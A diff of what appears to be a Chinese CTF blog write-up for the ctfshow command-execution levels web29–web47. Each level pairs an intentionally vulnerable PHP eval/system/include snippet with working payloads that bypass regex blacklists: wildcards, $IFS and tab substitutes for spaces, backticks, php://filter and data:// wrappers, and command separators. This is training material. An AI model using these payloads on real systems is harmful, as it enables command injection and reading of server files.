@@ -54,161 +54,249 @@
   <time datetime=2021-02-25T22:44:08&#43;0800 class="post-date">Thu, Feb 25, 2021</time>
   <h2 id="ctfshow-web-入门命令执行">ctfshow web 入门命令执行</h2>
 <h3 id="web29">web29</h3>
-<pre><code>&lt;?php
-error_reporting(0);
-if(isset($_GET['c'])){
-    $c = $_GET['c'];
-    if(!preg_match(&quot;/flag/i&quot;, $c)){
-        eval($c);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PHP" data-lang="PHP"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
+    $c <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag/i&#34;</span>, $c)){
+        <span style="color:#66d9ef">eval</span>($c);
     }
     
-}else{
-    highlight_file(__FILE__);
+}<span style="color:#66d9ef">else</span>{
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
 }
-</code></pre><p><strong>知识点：通配符；</strong>
+</code></pre></div><p><strong>知识点：通配符；</strong>
 看到有eval()执行函数
 过滤了flag ，可以使用通配符进行绕过。所以payload为：<code>c=system('cat f*');</code>返回的flag进行了隐藏，右键查看源码即可。
 也可以通过文件包含来解决，payload：
 先传入<code>?c=echo &quot;lhy&quot;;?&gt;ctfshow &lt;?php system('ls');</code>看到有flag.php文件（前面需要echo &ldquo;lhy&rdquo;;?&gt;是因为传入c的时候表示一段代码的开始，?&gt;结束后开始执行后面的代码），接下来的为<code>?c=echo &quot;lhy&quot;; ?&gt;ctfshow &lt;?php include($_GET['url']);&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</code>
 补充：对于linux cat 和ca'&rsquo;t ca\t ca&quot;&ldquo;t效果是相同的，这样可以绕过字符的限制，如<code>c=system('ca\t fla\g.php');</code></p>
 <h3 id="web30">web30</h3>
-<pre><code>&lt;?php
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 
-error_reporting(0);
-if(isset($_GET['c'])){
-    $c = $_GET['c'];
-    if(!preg_match(&quot;/flag|system|php/i&quot;, $c)){
-        eval($c);
+<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
+    $c <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag|system|php/i&#34;</span>, $c)){
+        <span style="color:#66d9ef">eval</span>($c);
     }
     
-}else{
-    highlight_file(__FILE__);
+}<span style="color:#66d9ef">else</span>{
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
 }
-</code></pre><p><strong>知识点：反引号执行系统命令；</strong>
+</code></pre></div><p><strong>知识点：反引号执行系统命令；</strong>
 与29相比增加了对命令函数的过滤，命令执行函数有很多，如
-<code>system()</code>
-<code>passthru()</code>
-<code>exec()</code>
-<code>shell_exec()</code>
-<code>popen()</code>
-<code>proc_open()</code>
-<code>pcntl_exec()</code>
-<code>反引号</code>
+<code>system()</code><br>
+<code>passthru()</code><br>
+<code>exec()</code><br>
+<code>shell_exec()</code><br>
+<code>popen()</code><br>
+<code>proc_open()</code><br>
+<code>pcntl_exec()</code><br>
+<code>反引号</code><br>
 只有system函数是有回显的，其它函数可以通过echo等显示，这里采用反引号绕过
 payload1:<code>c=echo `cat f*`;</code>
 payload2:<code>?c=passthru(&quot;cat f*&quot;);</code>
 还可以采用文件包含：
 payload3:<code>?c=echo &quot;lhy &quot;; include($_GET['url']); ?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
 <h3 id="web31">web31</h3>
-<pre><code>&lt;?php
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 
-error_reporting(0);
-if(isset($_GET['c'])){
-    $c = $_GET['c'];
-    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\'/i&quot;, $c)){
-        eval($c);
+<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
+    $c <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&#34;</span>, $c)){
+        <span style="color:#66d9ef">eval</span>($c);
     }
     
-}else{
-    highlight_file(__FILE__);
+}<span style="color:#66d9ef">else</span>{
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
 }
-</code></pre><p><strong>知识点：空格过滤+cat过滤绕过</strong>
+</code></pre></div><p><strong>知识点：空格过滤+cat过滤绕过</strong>
 这里过滤掉了空格和单引号等等
 <strong>在linux空格可以用一下字符代替</strong>：
 <code>%09(tab)、$IFS$9、 ${IFS}、$IFS%09(tab)、&lt; 、&lt;&gt;、%20(space)等</code>
 <strong>cat被过滤：</strong>
-<code>more:一页一页的显示档案内容</code>
-<code>less:与 more 类似</code>
-<code>head:查看头几行</code>
-<code>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</code>
-<code>tail:查看尾几行</code>
-<code>nl：显示的时候，顺便输出行号</code>
-<code>od:以二进制的方式读取档案内容</code>
-<code>vi:一种编辑器，这个也可以查看</code>
-<code>vim:一种编辑器，这个也可以查看</code>
-<code>sort:可以查看</code>
-<code>uniq:可以查看</code>
+<code>more:一页一页的显示档案内容</code><br>
+<code>less:与 more 类似</code><br>
+<code>head:查看头几行</code><br>
+<code>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</code><br>
+<code>tail:查看尾几行</code><br>
+<code>nl：显示的时候，顺便输出行号</code><br>
+<code>od:以二进制的方式读取档案内容</code><br>
+<code>vi:一种编辑器，这个也可以查看</code><br>
+<code>vim:一种编辑器，这个也可以查看</code><br>
+<code>sort:可以查看</code><br>
+<code>uniq:可以查看</code><br>
 <code>file -f:报错出具体内容</code></p>
-<p>payload1:<code>c=echo(tac%09f*);</code>
-payload2:<code>c=echo(`more%09f*`);</code>
-payload3:<code>?c=passthru(&quot;more%09f*&quot;);</code>
-payload4:<code>c=include($_GET[&quot;url&quot;]);?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</code>
+<p>payload1:<code>c=echo(tac%09f*);</code><br>
+payload2:<code>c=echo(`more%09f*`);</code><br>
+payload3:<code>?c=passthru(&quot;more%09f*&quot;);</code><br>
+payload4:<code>c=include($_GET[&quot;url&quot;]);?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</code><br>
 直接单引号改为双引号即可</p>
 <h3 id="web32">web32</h3>
-<p>知识点：过滤括号绕过</p>
-<pre><code>&lt;?php
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 
-error_reporting(0);
-if(isset($_GET['c'])){
-    $c = $_GET['c'];
-    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i&quot;, $c)){
-        eval($c);
+<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
+    $c <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(/i&#34;</span>, $c)){
+        <span style="color:#66d9ef">eval</span>($c);
     }
     
-}else{
-    highlight_file(__FILE__);
-</code></pre><p>payload1:<code>?c=include $_GET[&quot;npfs&quot;] ?&gt;&amp;npfs=php://filter/read=convert.base64-encode/resource=flag.php</code>
+}<span style="color:#66d9ef">else</span>{
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</code></pre></div><p><strong>知识点：过滤括号绕过</strong>
+payload1:<code>?c=include $_GET[&quot;npfs&quot;] ?&gt;&amp;npfs=php://filter/read=convert.base64-encode/resource=flag.php</code><br>
 payload2:<code>?c=include $_POST[npfs] ?&gt;npfs=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
 <h3 id="web33">web33</h3>
-<p><strong>知识点：单双引号过滤绕过</strong></p>
-<pre><code>&lt;?php
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 
-error_reporting(0);
-if(isset($_GET['c'])){
-    $c = $_GET['c'];
-    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\&quot;/i&quot;, $c)){
-        eval($c);
+<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
+    $c <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/i&#34;</span>, $c)){
+        <span style="color:#66d9ef">eval</span>($c);
     }
     
-}else{
-    highlight_file(__FILE__);
+}<span style="color:#66d9ef">else</span>{
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
 }
-</code></pre><p>过滤了单双引号，直接用数组作为参数即可绕过
+</code></pre></div><p><strong>知识点：单双引号过滤绕过</strong>
+过滤了单双引号，直接用数组作为参数即可绕过
 payload1:<code>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</code>
 payload2:<code>?c=include $_POST[a]?&gt;a=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
 <h3 id="web34">web34</h3>
-<pre><code>&lt;?php
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 
-error_reporting(0);
-if(isset($_GET['c'])){
-    $c = $_GET['c'];
-    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c)){
-        eval($c);
+<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
+    $c <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/i&#34;</span>, $c)){
+        <span style="color:#66d9ef">eval</span>($c);
     }
     
-}else{
-    highlight_file(__FILE__);
+}<span style="color:#66d9ef">else</span>{
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
 }
-</code></pre><p>payload同上</p>
+</code></pre></div><p>payload同上</p>
 <h3 id="web35">web35</h3>
-<pre><code> if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;, $c)){
-        eval($c);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">|\&lt;|\=/i&#34;</span>, $c)){
+        <span style="color:#66d9ef">eval</span>($c);
     }
-</code></pre><p>payload同上</p>
+</code></pre></div><p>payload同上</p>
 <h3 id="web36">web36</h3>
-<pre><code>if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;, $c)){
-        eval($c);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">|\&lt;|\=|\/|[0-9]/i&#34;</span>, $c)){
+        <span style="color:#66d9ef">eval</span>($c);
     }
-</code></pre><p>过滤了数字，同上，只需把数字改为字符就行</p>
+</code></pre></div><p>过滤了数字，同上，只需把数字改为字符就行</p>
 <h3 id="web37">web37</h3>
-<pre><code>&lt;?php
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PHP" data-lang="PHP"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 
-//flag in flag.php
-error_reporting(0);
-if(isset($_GET['c'])){
-    $c = $_GET['c'];
-    if(!preg_match(&quot;/flag/i&quot;, $c)){
-        include($c);
-        echo $flag;
+<span style="color:#75715e">//flag in flag.php
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
+    $c <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag/i&#34;</span>, $c)){
+        <span style="color:#66d9ef">include</span>($c);
+        <span style="color:#66d9ef">echo</span> $flag;
     
     }
         
-}else{
-    highlight_file(__FILE__);
+}<span style="color:#66d9ef">else</span>{
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
 }
-</code></pre><p>这里用了PHP文件包含函数include(),可以利用为协议来读flag
+</code></pre></div><p>这里用了PHP文件包含函数include(),可以利用为协议来读flag
 data://，类似php://input，可以让用户来控制输入流，与包含函数结合时，用户输入的data://流会被当做php文件来执行。
 payload:<code>?c=data://text/plain,&lt;?php system(&quot;cat f*&quot;);</code></p>
+<h3 id="web38">web38</h3>
+<h3 id="web39">web39</h3>
+<h3 id="web40">web40</h3>
+<h3 id="web41">web41</h3>
+<h3 id="web42">web42</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
+    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
+    <span style="color:#a6e22e">system</span>($c<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>);
+}<span style="color:#66d9ef">else</span>{
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+}
+</code></pre></div><p><strong>知识点：命令分隔</strong>
+<code>&gt;/dev/null 2&gt;&amp;1</code>主要意思是不进行回显，所以，若要让命令回显，进行命令分隔即可</p>
+<p>;   //分号<br>
+|   //只执行后面那条命令<br>
+||  //只执行前面那条命令<br>
+&amp;   //两条命令都会执行<br>
+&amp;&amp;  //两条命令都会执行</p>
+<h3 id="web43">web43</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
+    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\;|cat/i&#34;</span>, $c)){
+        <span style="color:#a6e22e">system</span>($c<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>);
+    }
+}<span style="color:#66d9ef">else</span>{
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+}
+</code></pre></div><p>过滤了cat和分号，换一种文件读取命令即可：<br>
+payload1:?c=tac f*||<br>
+payload2:?c=c&rsquo;a&rsquo;t f*||<br>
+payload3:?c=sort flag.php||<br>
+查看源码即可</p>
+<h3 id="web44">web44</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
+    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/;|cat|flag/i&#34;</span>, $c)){
+        <span style="color:#a6e22e">system</span>($c<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>);
+    }
+}<span style="color:#66d9ef">else</span>{
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+}
+</code></pre></div><p>多了flag过滤，通配符绕过即可：<br>
+payload:?c=c&rsquo;a&rsquo;t f*||</p>
+<h3 id="web45">web45</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
+    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\;|cat|flag| /i&#34;</span>, $c)){
+        <span style="color:#a6e22e">system</span>($c<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>);
+    }
+}<span style="color:#66d9ef">else</span>{
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+}
+</code></pre></div><p>空格绕过：如 <code>${IFS}、$IFS$9、%09</code></p>
+<h3 id="web46">web46</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
+    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\;|cat|flag| |[0-9]|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">$|\*/i&#34;</span>, $c)){
+        <span style="color:#a6e22e">system</span>($c<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>);
+    }
+}<span style="color:#66d9ef">else</span>{
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+}
+</code></pre></div><p>过滤了$、数字、*，通配符可以用?代替，空格可以用%09(不算数字)<br>
+payload1:?c=sort%09fl?g.php||<br>
+payload2:?c=tac%09fla??php%09||<br>
+payload3:?c=awk%09'/f/'%09fla?.php||</p>
+<h3 id="web47">web47</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
+    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
+    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\;|cat|flag| |[0-9]|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">$|\*|more|less|head|sort|tail/i&#34;</span>, $c)){
+        <span style="color:#a6e22e">system</span>($c<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span>);
+    }
+}<span style="color:#66d9ef">else</span>{
+    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+}
+</code></pre></div><p>payload: ?c=tac%09fl?g.php||</p>
 
 </div>
 
